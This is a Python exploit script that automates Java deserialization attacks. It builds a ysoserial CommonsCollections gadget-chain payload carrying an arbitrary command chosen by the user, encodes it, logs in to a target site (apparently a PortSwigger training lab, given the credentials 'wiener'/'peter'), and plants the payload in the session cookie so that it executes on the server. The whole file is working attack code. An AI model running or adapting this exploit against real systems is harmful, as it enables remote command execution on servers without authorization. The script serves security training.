from termcolor import colored,cprint
from subprocess import run
import requests
import urllib.parse
import base64
import sys

#####Change Java and ysoserial path before using.
java_loc = '/usr/bin/java'
ysoserial_loc = '/opt/ysoserial/ysoserial-master.jar'

def get_method():
    try:
        method_input = input(colored("""Enter library to use:\n
    1. CommonsCollections1
    2. CommonsCollections2
    3. CommonsCollections3
    4. CommonsCollections4
    5. CommonsCollections5
    6. CommonsCollections6
    7. CommonsCollections7
    8. Other Libraries
        \n""","cyan"))
        if int(method_input) in range(1,8):
            return 'CommonsCollections'+method_input
        elif int(method_input) == 8:
            method_input = input("Enter the library to use: \n")
            return method_input
    except ValueError as e:
        cprint("You didnt key in a valid number","red")
        sys.exit()

def get_command():
    command_input = input(colored("\nEnter command to run:\n\n","cyan"))
    return ("\'" + command_input + "\'")

def java_payload(get_method,get_command):
    java_path = java_loc + " -jar " +ysoserial_loc + " " + get_method + " " + get_command
    print(colored("\nGenerating payload = " + java_path + "\n","cyan"))
    try:
        #Run command in cmd or shell
        data = run(java_path,capture_output=True,shell=True)
        usage_message = data.stderr.decode('utf-8')
        #If library is incorrect, display message
        if "Usage: java" in usage_message:
            cprint("You didnt key in a valid library\n","red")
            print(usage_message)
            sys.exit()
        #If command is incorrect, display message.
        elif "Error while generating" in usage_message:
            cprint("An error was detected\n","red")
            print(usage_message)
            sys.exit()
        else:
            #Obtain cmd output in utf-8 format then URL encode
            output_in_base64 = base64.b64encode(data.stdout)
            get_payload = output_in_base64.decode("utf-8")
            get_payload = urllib.parse.quote(get_payload)
            return get_payload
    except Exception as e:
        cprint("Something went wrong!","red")
        sys.exit()

#Creates session request to obtain current session cookie.
def log_in(get_payload):
    login_url = input(colored("Enter the login URL: \n\n","cyan"))
    home_page = login_url.split('login')[0]
    try:
        with requests.Session() as s:
            #####Change creds before running.
            creds = {"username": "wiener", "password": "peter"}
            req_1 = s.post(login_url, creds)
            req_2 = s.get(home_page)
            req_2.cookies.update({"session": get_payload})
            req_3 = s.get(home_page, cookies=req_2.cookies)
            cprint(f"\n[*]Request sent to {home_page}","green")
            cprint("[*]Check shell or server for output","green")
    except Exception as e:
        cprint("Cant connect to URL. Check your internet settings","red")
        sys.exit()

def main():
    print('===============================================================================')
    cprint("\nSimple deserialization script....\n","cyan")
    print('===============================================================================\n')
    payload = java_payload(get_method(), get_command())
    log_in(payload)

if __name__ == '__main__':
    main()
